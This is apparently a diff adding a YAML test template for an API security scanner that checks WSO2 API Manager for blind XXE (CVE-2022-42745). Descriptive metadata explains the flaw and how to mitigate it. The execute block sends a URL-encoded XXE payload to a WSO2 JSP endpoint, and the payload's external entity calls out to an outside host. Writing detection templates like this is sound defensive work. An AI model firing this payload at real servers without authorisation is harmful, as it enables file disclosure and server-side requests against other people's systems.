@@ -1,0 +1,82 @@
+id: WSO2_API_MANAGER_XXE
+info:
+  name: "WSO2 API Manager Blind XXE Test"
+  description: "The WSO2 API Manager Blind XXE (XML External Entity) Test involves checking for XML External Entity injection vulnerabilities in the WSO2 API Manager. This type of vulnerability occurs when the application processes XML input without properly validating or disabling external entities, allowing attackers to access sensitive files or make network requests. In a blind XXE attack, the attacker may not receive direct feedback, but can still exploit the vulnerability to gain information or cause system disruptions. Securing XML parsers and disabling external entity resolution can help mitigate this risk."
+  details: "The WSO2 API Manager Blind XXE Test focuses on identifying potential XML External Entity (XXE) injection vulnerabilities in the WSO2 API Manager. This vulnerability arises when XML data is processed without proper validation, allowing attackers to craft malicious XML input that triggers the parser to load external resources, such as files from the local system or remote URLs. In blind XXE attacks, feedback from the application might be minimal, making detection harder, but attackers can still exploit the vulnerability to access sensitive files or perform Denial of Service (DoS) attacks. To prevent this, it's crucial to configure the XML parser securely and disable the resolution of external entities."
+  impact: "The impact of a WSO2 API Manager Blind XXE vulnerability can be significant, as it allows attackers to potentially access sensitive files on the server, such as configuration files or credentials, without direct feedback from the application. In addition to information disclosure, attackers can use blind XXE to perform Denial of Service (DoS) attacks, overwhelm the system with resource-intensive external requests, or execute further exploits. Properly securing XML parsers and disabling external entity resolution are essential to mitigate these risks and protect the system from exploitation."
+  category:
+    name: INJECT
+    shortName: Injection Attacks
+    displayName: Injection Attacks (INJECT)
+  subCategory: WSO2_API_MANAGER_XXE
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
+    - "https://www.akto.io/blog/xml-external-entity-attack"
+    - "https://www.akto.io/blog/xml-injection-vulnerability-examples-cheatsheet-and-prevention"
+  cwe:
+    - CWE-611
+    - CWE-827
+  cve:
+    - CVE-2022-42745
+
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  method:
+    eq: POST
+
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_url: "/carbon/generic/save_artifact_ajaxprocessor.jsp"
+        - modify_header:
+            content-type: "application/x-www-form-urlencoded"
+        - replace_body: 'payload=<%3fxml+version%3d"1.0"+%3f><!DOCTYPE+a+[+<!ENTITY+%25+xxe+SYSTEM+"http%3a//akto.io">%25xxe%3b]>'
+validate:
+  response_payload:
+    length:
+      gt: 0
+    contains_either: "Failed to install the generic artifact type"
